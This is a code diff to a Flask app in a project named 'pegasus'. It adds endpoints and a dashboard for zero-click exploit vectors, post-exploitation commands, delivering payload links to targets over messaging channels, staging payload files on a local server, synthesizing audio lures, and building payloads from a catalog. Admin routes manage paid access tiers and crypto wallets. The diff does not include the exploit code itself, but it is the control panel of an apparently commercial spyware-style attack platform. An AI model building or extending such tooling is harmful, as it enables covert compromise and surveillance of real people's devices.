@@ -146,6 +146,8 @@ def create_app() -> Flask:
                 "api_exploits", "api_exploits_run", "api_nso", "api_nso_run", "api_post_exploitation",
                 "api_post_exploit_run", "api_features_mutation", "api_features_payload", "api_features_dna",
                 "api_features_stego", "api_features_telegram", "api_features_frp", "api_capabilities",
+                "api_delivery_channels", "api_delivery_send", "api_delivery_serve", "api_delivery_stop",
+                "api_delivery_stage", "api_delivery_history", "api_delivery_audio", "api_catalog", "api_catalog_build", "api_command",
                 "admin", "admin_users", "admin_settings", "api_payment_claim", "api_payment_verify",
             }
             if request.endpoint not in allowed and request.endpoint and not request.path.startswith("/static"):
@@ -177,7 +179,60 @@ def create_app() -> Flask:
     # -- pages -------------------------------------------------------------
     @app.route("/")
     def index():
-        return render_template("dashboard.html", user=g.user, csrf=g.csrf)
+        from pegasus.modules.access_workflow import catalog, delivery, post_exploitation, zero_click
+        from pegasus.modules.access_workflow.nso_capabilities import parity_report
+
+        devices = adb_devices()
+        events = delivery.history(100)
+        ok = sum(1 for event in events if event.get("ok"))
+        success = round(100 * ok / len(events)) if events else 0
+        return render_template(
+            "dashboard.html",
+            user=g.user,
+            csrf=g.csrf,
+            devices=devices,
+            stats={
+                "devices": len(devices),
+                "vectors": len(zero_click.EXPLOITS),
+                "post_steps": len(post_exploitation.COMMANDS),
+                "success": success,
+            },
+            channels=delivery.list_channels(),
+            server=delivery.server_info(),
+            delivery_history=events[:8],
+            catalog=catalog.list_vectors()[:40],
+            parity=parity_report(),
+            notifications=auth.notifications() if g.user and g.user.role == "admin" else [],
+        )
+
+    @app.route("/api/command", methods=["POST"])
+    def api_command():
+        import asyncio
+
+        from pegasus.modules.integrations import initialize_slash_commands
+        from pegasus.modules.access_workflow import commands as aw_commands
+
+        body = request.get_json(silent=True) or {}
+        name = body.get("name", "").lstrip("/")
+        if not name:
+            return jsonify({"error": "command name required"}), 400
+
+        class _Ctx:
+            logger = None
+            settings = None
+            hooks = None
+            db = None
+            commands: Dict[str, Any] = {}
+
+        manager = initialize_slash_commands(_Ctx())
+        aw_commands.register(manager)
+        if manager.get_command("/" + name) is None:
+            return jsonify({"error": f"unknown command: {name}"}), 404
+        try:
+            result = asyncio.run(manager.execute(name, body.get("args") or []))
+        except Exception as exc:
+            return jsonify({"error": str(exc)}), 400
+        return jsonify({"command": name, "result": result})
 
     @app.route("/setup", methods=["GET", "POST"])
     def setup():
@@ -509,6 +564,91 @@ def create_app() -> Flask:
             abort(404)
         return send_file(files[-1], mimetype="image/png")
 
+    # -- delivery + payload catalog ---------------------------------------
+    @app.route("/api/delivery/channels")
+    def api_delivery_channels():
+        from pegasus.modules.access_workflow import delivery
+
+        return jsonify({"channels": delivery.list_channels(), "server": delivery.server_info()})
+
+    @app.route("/api/delivery/send", methods=["POST"])
+    def api_delivery_send():
+        from pegasus.modules.access_workflow import delivery
+
+        body = request.get_json(silent=True) or {}
+        try:
+            record = delivery.send(
+                body.get("channel", ""),
+                body.get("target", ""),
+                body.get("url", ""),
+                serial=body.get("serial") or None,
+                auto_send=bool(body.get("auto_send")),
+            )
+        except (delivery.DeliveryError, OSError, subprocess.TimeoutExpired) as exc:
+            return jsonify({"error": str(exc)}), 400
+        return jsonify(record)
+
+    @app.route("/api/delivery/serve", methods=["POST"])
+    def api_delivery_serve():
+        from pegasus.modules.access_workflow import delivery
+
+        body = request.get_json(silent=True) or {}
+        try:
+            return jsonify(delivery.start_server(int(body.get("port", 8080))))
+        except delivery.DeliveryError as exc:
+            return jsonify({"error": str(exc)}), 400
+
+    @app.route("/api/delivery/serve", methods=["DELETE"])
+    def api_delivery_stop():
+        from pegasus.modules.access_workflow import delivery
+
+        return jsonify(delivery.stop_server())
+
+    @app.route("/api/delivery/stage", methods=["POST"])
+    def api_delivery_stage():
+        from pegasus.modules.access_workflow import delivery
+
+        body = request.get_json(silent=True) or {}
+        try:
+            delivery.start_server(int(body.get("port", 8080)))
+            return jsonify(delivery.stage_file(body.get("path", "")))
+        except (delivery.DeliveryError, OSError) as exc:
+            return jsonify({"error": str(exc)}), 400
+
+    @app.route("/api/delivery/history")
+    def api_delivery_history():
+        from pegasus.modules.access_workflow import delivery
+
+        return jsonify({"events": delivery.history()})
+
+    @app.route("/api/delivery/audio", methods=["POST"])
+    def api_delivery_audio():
+        from pegasus.modules.access_workflow import delivery
+
+        body = request.get_json(silent=True) or {}
+        path = delivery.synth_audio(delivery.transcript_for(body.get("url", "")))
+        return jsonify({"path": str(path), "size": path.stat().st_size, "transcript": delivery.transcript_for(body.get("url", ""))})
+
+    @app.route("/api/catalog")
+    def api_catalog():
+        from pegasus.modules.access_workflow import catalog
+
+        return jsonify({
+            "vectors": catalog.list_vectors(request.args.get("category"), request.args.get("search")),
+            "categories": catalog.categories(),
+        })
+
+    @app.route("/api/catalog/build", methods=["POST"])
+    def api_catalog_build():
+        from pegasus.modules.access_workflow import catalog
+
+        body = request.get_json(silent=True) or {}
+        try:
+            result = catalog.build_and_stage(body.get("key", "")) if body.get("stage") else catalog.build(body.get("key", ""))
+        except (catalog.CatalogError, OSError, ImportError) as exc:
+            return jsonify({"error": str(exc)}), 400
+        return jsonify(result)
+
     # -- admin API ---------------------------------------------------------
     @app.route("/api/admin/approve/<user_id>", methods=["POST"])
     def api_approve(user_id: str):
@@ -527,6 +667,90 @@ def create_app() -> Flask:
         admin_required()
         auth.mark_notifications_read()
         return jsonify({"status": "read"})
+
+    @app.route("/api/admin/users/<user_id>/tier", methods=["POST"])
+    def api_admin_tier(user_id: str):
+        admin_required()
+        body = request.get_json(silent=True) or {}
+        try:
+            user = auth.admin_set_tier(user_id, body.get("tier", "one_time"), body.get("days"))
+        except auth.AuthError as exc:
+            return jsonify({"error": str(exc)}), 400
+        return jsonify({"status": "ok", "tier": user.access_tier, "expires": user.access_expires_at.isoformat() if user.access_expires_at else None})
+
+    @app.route("/api/admin/users/<user_id>/active", methods=["POST"])
+    def api_admin_active(user_id: str):
+        admin_required()
+        try:
+            user = auth.admin_toggle_active(user_id)
+        except auth.AuthError as exc:
+            return jsonify({"error": str(exc)}), 400
+        return jsonify({"status": "ok", "active": user.is_active})
+
+    @app.route("/api/admin/users/<user_id>/passkey", methods=["POST"])
+    def api_admin_passkey(user_id: str):
+        admin_required()
+        try:
+            temp = auth.admin_reset_passkey(user_id)
+        except auth.AuthError as exc:
+            return jsonify({"error": str(exc)}), 400
+        return jsonify({"status": "ok", "passkey": temp})
+
+    @app.route("/api/admin/users/<user_id>/wallet", methods=["POST"])
+    def api_admin_wallet(user_id: str):
+        admin_required()
+        body = request.get_json(silent=True) or {}
+        try:
+            user = auth.admin_set_wallet(user_id, body.get("wallet", ""))
+        except auth.AuthError as exc:
+            return jsonify({"error": str(exc)}), 400
+        return jsonify({"status": "ok", "wallet": user.wallet_address})
+
+    @app.route("/api/admin/users/<user_id>", methods=["DELETE"])
+    def api_admin_delete(user_id: str):
+        admin_required()
+        try:
+            auth.admin_delete_user(user_id)
+        except auth.AuthError as exc:
+            return jsonify({"error": str(exc)}), 400
+        return jsonify({"status": "deleted"})
+
+    @app.route("/api/admin/system")
+    def api_admin_system():
+        admin_required()
+        import shutil
+
+        from pegasus.modules.access_workflow import daemon_service
+
+        snapshot = daemon_service.get_daemon().status()
+        disk = shutil.disk_usage(str(Path.home()))
+        return jsonify({
+            "daemon": snapshot,
+            "disk": {"free": disk.free, "total": disk.total, "percent": round(100 * disk.used / disk.total, 1)},
+            "db": {"path": str(auth._db_path), "exists": auth._db_path.exists()},
+            "parity": parity_report(),
+            "devices": len(adb_devices()),
+        })
+
+    @app.route("/api/admin/logs")
+    def api_admin_logs():
+        admin_required()
+        log = Path.home() / ".pegasus" / "daemon" / "daemon.log"
+        if not log.exists():
+            return jsonify({"lines": [], "path": str(log)})
+        lines = log.read_text(encoding="utf-8", errors="replace").splitlines()[-120:]
+        return jsonify({"lines": lines, "path": str(log)})
+
+    @app.route("/api/admin/daemon/<action>", methods=["POST"])
+    def api_admin_daemon(action: str):
+        admin_required()
+        from pegasus.modules.access_workflow import daemon_service
+
+        daemon = daemon_service.get_daemon(port=5050)
+        if action not in {"start", "stop", "restart"}:
+            return jsonify({"error": "unknown action"}), 400
+        getattr(daemon, action)()
+        return jsonify(daemon.status())
 
     @app.route("/api/payments/claim", methods=["POST"])
     def api_payment_claim():
